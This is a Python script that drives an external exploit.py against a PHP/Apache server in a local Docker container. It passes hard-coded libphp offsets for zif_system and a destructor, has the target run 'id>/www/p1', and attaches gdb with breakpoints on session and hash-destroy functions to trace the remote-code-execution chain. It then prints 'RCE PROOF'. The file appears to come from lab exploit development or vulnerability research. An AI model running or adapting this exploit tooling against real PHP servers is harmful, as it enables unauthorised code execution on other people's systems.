import os
import subprocess, sys, time, os

BASE = os.path.dirname(os.path.abspath(__file__))
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

# clean state
sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

env = os.environ.copy()
env["P2S_PAUSE"] = "15"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1", "--no-retry-rotate",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break

if not pause_hit:
    proc.wait(); sys.exit(1)

print("\n[*] PAUSE detected - attaching gdb to idle worker...", flush=True)
time.sleep(1)

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1] if pids else None
print(f"[*] worker PID: {worker_pid}", flush=True)

r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
maps_line = r.stdout.strip()
if not maps_line:
    print("[!] no libphp"); proc.kill(); sys.exit(1)
maps_base = int(maps_line.split("-")[0], 16)
print(f"[*] libphp base: {hex(maps_base)}", flush=True)

B = maps_base
zif_sys            = B + 0x3ac080
hash_destroy       = B + 0x4b4370
hash_rev_destroy   = B + 0x4b47d0
rshutdown          = B + 0x352ec0
track_init         = B + 0x350df0
sess_init          = B + 0x356a30

def bp(addr, label):
    return (
        f"break *{hex(addr)}\n"
        "commands\n"
        "silent\n"
        f"echo [HIT] {label}\\n"
        "bt 3\n"
        "continue\n"
        "end\n"
    )

gdb_script = (
    "set pagination off\n"
    "set confirm off\n"
    "set width 0\n"
    + bp(zif_sys, "zif_system(RCE)")
    + bp(hash_destroy, "zend_hash_graceful_destroy")
    + bp(hash_rev_destroy, "zend_hash_graceful_reverse_destroy")
    + bp(rshutdown, "php_rshutdown_session_globals")
    + bp(track_init, "php_session_track_init")
    + bp(sess_init, "php_session_initialize")
    + "continue\n"
)
gdb_local = os.path.join(BASE, "gdb_rce_trace.gdb")
with open(gdb_local, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gdb_local}" {c}:/tmp/gdb_rce_trace.gdb')

print("[*] attaching gdb (stays attached until exploit finishes)...", flush=True)
gdb_proc = subprocess.Popen(
    f'docker exec {c} sh -c "gdb -batch -p {worker_pid} -x /tmp/gdb_rce_trace.gdb > /tmp/gdb_rce.out 2>&1"',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, bufsize=1
)

# Let the exploit run to completion (it will send request B after the PAUSE)
try:
    out, _ = proc.communicate(timeout=200)
except subprocess.TimeoutExpired:
    proc.kill(); out, _ = proc.communicate()
print("\n=== EXPLOIT FULL OUTPUT (tail) ===", flush=True)
print(out[-1500:] if len(out) > 1500 else out, flush=True)

# Give the worker a moment to finish, then interrupt gdb
time.sleep(3)
sh(f'docker exec {c} sh -c "pkill -INT gdb 2>/dev/null"')
time.sleep(2)
sh(f'docker exec {c} sh -c "pkill -9 gdb 2>/dev/null"')
try:
    gdb_proc.wait(timeout=10)
except subprocess.TimeoutExpired:
    gdb_proc.kill()

r = sh(f'docker exec {c} cat /tmp/gdb_rce.out 2>/dev/null')
print("\n=== GDB RCE-CHAIN TRACE ===", flush=True)
print(r.stdout if r.stdout else "(empty)", flush=True)

r = sh(f'docker exec {c} cat /www/p1 2>/dev/null')
if r.stdout.strip():
    print(f"\n[+] RCE PROOF: {r.stdout.strip()[:80]}", flush=True)
else:
    print("\n[-] no RCE proof", flush=True)
